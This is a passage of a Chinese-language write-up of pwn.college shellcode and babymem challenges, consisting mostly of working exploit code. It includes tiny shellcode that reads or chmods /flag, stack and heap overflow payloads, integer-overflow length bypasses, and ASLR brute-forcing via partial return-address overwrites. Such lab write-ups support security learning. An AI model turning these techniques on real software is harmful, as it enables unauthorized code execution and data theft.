</span></span></code></pre></div><h3 id=8-2 class="relative group">8 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#8-2 aria-label=锚点>#</a></span></h3><p>只能读 0x12 字节，因此要尽量缩短汇编代码的长度。由于 <code>/flag</code> 最终需要占 8 字节，需要 64 位寄存器存储，因此可以 <code>ln -s /flag a</code> 创建一个名为 <code>a</code> 的符号链接。权限方面也只需要 others 拥有读权限，因此设置为最小值 <code>4</code> 即可。最后根据情况缩减所使用的寄存器长度。</p><p>注意这里用 <code>mov bx, 0x61</code> 而不是 <code>bl</code>，是因为我们将 <code>bx</code> 推到栈上时有可能并没有遇到 0 字节，使得字符串 <code>a</code> 没能结尾。因此我们给 <code>bx</code> 赋值可以保证字符串以 0 字节结尾。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov bx, 0x61  # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=9-1 class="relative group">9 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#9-1 aria-label=锚点>#</a></span></h3><p>每 10 字节会插入 10 字节的 0xcc，也就是 <code>int 3</code>，题目提示我们要阻止这些 <code>int 3</code> 被执行，因此计算好字节数并 <code>jmp</code> 掉即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>mov bx, 0x61  # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>push rbx
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>jmp .L2
</span></span></span><span class=line><span class=cl><span class=s2>.rept 10
</span></span></span><span class=line><span class=cl><span class=s2>nop
</span></span></span><span class=line><span class=cl><span class=s2>.endr
</span></span></span><span class=line><span class=cl><span class=s2>.L2:
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=10-12 class="relative group">10-12 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#10-12 aria-label=锚点>#</a></span></h3><p>payload 和 8 相同，因为 8 的 payload 恰好可以满足这几题的条件。</p><h3 id=13-2 class="relative group">13 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#13-2 aria-label=锚点>#</a></span></h3><p>只能读 0xc 字节，需要进一步压缩 8 的 payload。容易注意到 <code>mov bx, 0x61</code> 和 <code>push rbx</code> 可以合并为 <code>push 0x61</code>，恰好 12 字节。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># chmod(&#34;a&#34;, 4)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov al, 0x5a  # chmod
</span></span></span><span class=line><span class=cl><span class=s2>push 0x61     # &#34;a&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rdi, rsp  # rdi -&gt; &#34;a&#34; on stack
</span></span></span><span class=line><span class=cl><span class=s2>mov sil, 4    # 4 -&gt; 000 000 100
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>))</span>
</span></span></code></pre></div><h3 id=14-2 class="relative group">14 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#14-2 aria-label=锚点>#</a></span></h3><p>只能读 6 字节。注意到 rax 原本就是 0，可以省略对其的初始化；gdb 中能看到 rdx 中原本存储了 shellcode 的地址，因此我们可以直接写入这个地址；rsi 中原本存储了一个较大的数字，我们可以直接用来作为 <code>read</code> 的第三个参数。综上，要做的只有给 rdi 赋值 0、将 rdx 的值赋值给 rsi、调用 syscall 三件事，每件事都可以压缩到 2 个字节。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># read(0, address of shellcode, some big number)</span>
</span></span><span class=line><span class=cl><span class=n>sc1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>xor edi, edi
</span></span></span><span class=line><span class=cl><span class=s2>push rdx
</span></span></span><span class=line><span class=cl><span class=s2>pop rsi
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># orw</span>
</span></span><span class=line><span class=cl><span class=n>sc2</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>readfile</span><span class=p>(</span><span class=s2>&#34;/flag&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>sc1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>nop</span><span class=o>*</span><span class=mi>16</span> <span class=o>+</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc2</span><span class=p>))</span>
</span></span></code></pre></div><h2 id=babymem-memory-errors class="relative group">babymem: Memory Errors <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#babymem-memory-errors aria-label=锚点>#</a></span></h2><p>模版：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sa</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delim</span><span class=p>,</span><span class=n>data</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>delim</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>num</span><span class=o>=</span><span class=mi>4096</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>delims</span><span class=p>,</span><span class=n>drop</span><span class=o>=</span><span class=kc>True</span><span class=p>:</span> <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>delims</span><span class=p>,</span><span class=n>drop</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>addr</span><span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s1>&#39;</span><span class=si>{}</span><span class=s1> = </span><span class=si>{:#x}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>s</span><span class=p>(</span><span class=n>pl</span><span class=p>,</span> <span class=n>sz</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>sz</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sz</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sla</span><span class=p>(</span><span class=s1>&#39;Payload size: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>sz</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sa</span><span class=p>(</span><span class=s1>&#39;bytes)!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>pl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>binary</span>
</span></span><span class=line><span class=cl><span class=c1># context.log_level = &#39;DEBUG&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>nop</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x90</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># TODO</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=10-2 class="relative group">1.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#10-2 aria-label=锚点>#</a></span></h3><p>直接给了偏移量 44，只要溢出 1 字节就能将目标值改成非 0 了。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>44</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=11-2 class="relative group">1.1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#11-2 aria-label=锚点>#</a></span></h3><p>没有给偏移量，可以无视偏移量直接输入很长的 payload，因为 canary 检查在 <code>win</code> 执行之后。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x100</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=20-3 class="relative group">2.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#20-3 aria-label=锚点>#</a></span></h3><p>和 1.0 类似，只不过在堆上。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>192</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x01</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=21-3 class="relative group">2.1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#21-3 aria-label=锚点>#</a></span></h3><p>和 1.1 类似，只不过在堆上。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x200</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=30-1 class="relative group">3.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#30-1 aria-label=锚点>#</a></span></h3><p>提供了偏移量和目标函数地址，直接覆盖返回地址即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x401554</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=31-1 class="relative group">3.1 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#31-1 aria-label=锚点>#</a></span></h3><p>用 pwndbg 的 <code>cyclic</code> 可以准确确定偏移量，<code>info func</code> 可以得到 <code>win</code> 的地址。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x4020e1</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mi>128</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><blockquote><p>注：babymem 后续所有题目的 <code>x.1</code> 均是在 <code>x.0</code> 基础上要求自己确定偏移量和地址，不再赘述。</p></blockquote><h3 id=40-1 class="relative group">4.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#40-1 aria-label=锚点>#</a></span></h3><p>对输入长度进行检查，可以用整数溢出绕过，绕过后可能需要多运行几次才能成功，题目也给了提示：</p><blockquote><p>Because the read() call will interpret your size differently than the check above, the resulting read will be unstable and might fail. You will likely have to try this several times before your input is actually read.</p></blockquote><p>这里 <code>size</code> 也可以直接写 <code>-1</code>。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x401861</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=50-1 class="relative group">5.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#50-1 aria-label=锚点>#</a></span></h3><p>需要做一次乘法后得到溢出的结果，可以用 2 * 2147483648 得到。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x4017eb</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>152</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mi>2147483648</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;to send: &#39;</span><span class=p>,</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span><span class=p>(</span><span class=s1>&#39;record: &#39;</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span><span class=p>(</span><span class=s1>&#39;bytes)!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=60 class="relative group">6.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#60 aria-label=锚点>#</a></span></h3><p>题目给了做法，就是跳到检查语句后面的地址就可以绕过检查。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x402177</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>88</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=70-1 class="relative group">7.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#70-1 aria-label=锚点>#</a></span></h3><p>和 6.0 一样需要跳到检查语句后面，IDA 可以看到这个地址是 0x358，区别在于开启了 ASLR 我们只能确定地址的后三位。这里使用的技巧是仅仅覆盖最后两个字节，此时倒数第 4 个 bit 有 1/16 的概率猜对，多运行几次即可。</p><p>本题可以删除模版中的 <code>p=process(binary)</code> 一行。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x358</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>72</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></div><h3 id=80 class="relative group">8.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#80 aria-label=锚点>#</a></span></h3><p>在 7.0 的基础上，会用 <code>strlen</code> 检查 <code>buf</code> 长度，直接 0 字节截断即可。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0x14f</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=o>*</span><span class=mi>8</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>128</span> <span class=o>+</span> <span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></div><h3 id=90 class="relative group">9.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#90 aria-label=锚点>#</a></span></h3><p>本题需要覆盖读计数器，从而跳过 canary 写入返回地址，题目给了读计数器的实现：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>while</span> <span class=p>(</span><span class=n>n</span> <span class=o>&lt;</span> <span class=n>size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>n</span> <span class=o>+=</span> <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>input</span> <span class=o>+</span> <span class=n>n</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>还给了 <code>n</code> 的偏移量 36 和返回地址偏移量 56，因此根据上述实现将 <code>n</code> 覆盖为 55，下一次循环就可以写返回地址的最低字节了。由于要写最低两字节，因此 <code>size</code> 设置为 58 即可，和 payload 长度无关。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>win</span> <span class=o>=</span> <span class=mh>0xc0a</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>36</span><span class=o>+</span><span class=n>p8</span><span class=p>(</span><span class=mi>56</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>+</span><span class=n>p16</span><span class=p>(</span><span class=n>win</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mi>56</span><span class=o>+</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;pwn.college{&#39;</span> <span class=ow>in</span> <span class=n>res</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>[</span><span class=o>-</span><span class=mi>100</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></div><h3 id=100 class="relative group">10.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#100 aria-label=锚点>#</a></span></h3><p>flag 在栈上，距离输入 73 字节的地方，小于输入到 rbp 的距离，因此本题不需要溢出，也不用管 canary 和 ASLR，只需要填充 73 个非零字节，最后打印时就会顺带打印出后面的 flag。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>73</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=110 class="relative group">11.0 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#110 aria-label=锚点>#</a></span></h3><p>类似 10.0，只不过 mmap 在了堆上。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4096</span><span class=o>*</span><span class=mi>7</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
